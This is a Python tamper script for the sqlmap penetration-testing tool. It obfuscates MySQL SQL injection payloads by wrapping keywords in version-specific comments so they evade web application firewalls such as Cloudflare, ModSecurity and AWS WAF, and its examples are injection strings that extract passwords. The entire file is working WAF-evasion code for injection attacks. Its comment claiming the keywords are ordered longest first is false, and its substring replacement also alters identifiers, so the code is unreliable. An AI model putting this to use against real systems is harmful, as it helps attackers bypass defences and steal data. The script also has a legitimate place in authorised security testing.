#!/usr/bin/env python

"""
Copyright (c) 2006-2025 sqlmap developers (https://sqlmap.org/)
See the file 'LICENSE' for copying permission

Tamper script: cloudflare_keyword.py
Description: MySQL keyword obfuscation using version-specific comments
Author: Regaan
Priority: HIGHEST
"""

from lib.core.enums import PRIORITY

__priority__ = PRIORITY.HIGHEST

def dependencies():
    pass

def tamper(payload, **kwargs):
    """
    Wraps MySQL keywords with version-specific comments to bypass WAF keyword detection.
    
    This is a DETERMINISTIC transformation - same input always produces same output.
    
    Technique:
        Wraps SQL keywords in MySQL version comments: /*!50000KEYWORD*/
        These comments are executed by MySQL 5.0.0+ but may bypass WAF pattern matching.
    
    Tested against:
        * Cloudflare WAF
        * ModSecurity
        * AWS WAF
    
    Notes:
        * Only targets SQL keywords, preserves payload structure
        * Can be chained with other tamper scripts
        * Does NOT use random transformations
    
    >>> tamper("SELECT * FROM users WHERE id=1")
    '/*!50000SELECT*/ * /*!50000FROM*/ users /*!50000WHERE*/ id=1'
    
    >>> tamper("UNION SELECT password FROM admin")
    '/*!50000UNION*/ /*!50000SELECT*/ password /*!50000FROM*/ admin'
    """
    
    retVal = payload
    
    if payload:
        # MySQL keywords to obfuscate (order matters - longest first to avoid partial matches)
        keywords = [
            'SELECT', 'UNION', 'INSERT', 'UPDATE', 'DELETE', 'DROP', 'CREATE',
            'ALTER', 'TRUNCATE', 'REPLACE', 'HANDLER', 'LOAD', 'WHERE', 'FROM',
            'JOIN', 'INNER', 'OUTER', 'LEFT', 'RIGHT', 'CROSS', 'NATURAL',
            'ORDER', 'GROUP', 'HAVING', 'LIMIT', 'OFFSET', 'PROCEDURE',
            'FUNCTION', 'TRIGGER', 'EVENT', 'VIEW', 'INDEX', 'DATABASE',
            'TABLE', 'COLUMN', 'GRANT', 'REVOKE', 'EXECUTE', 'CALL'
        ]
        
        # Apply transformation to each keyword (case-insensitive)
        for keyword in keywords:
            # Match both uppercase and lowercase
            retVal = retVal.replace(keyword, f'/*!50000{keyword}*/')
            retVal = retVal.replace(keyword.lower(), f'/*!50000{keyword}*/')
            
            # Handle mixed case (common in obfuscated payloads)
            retVal = retVal.replace(keyword.capitalize(), f'/*!50000{keyword}*/')
    
    return retVal
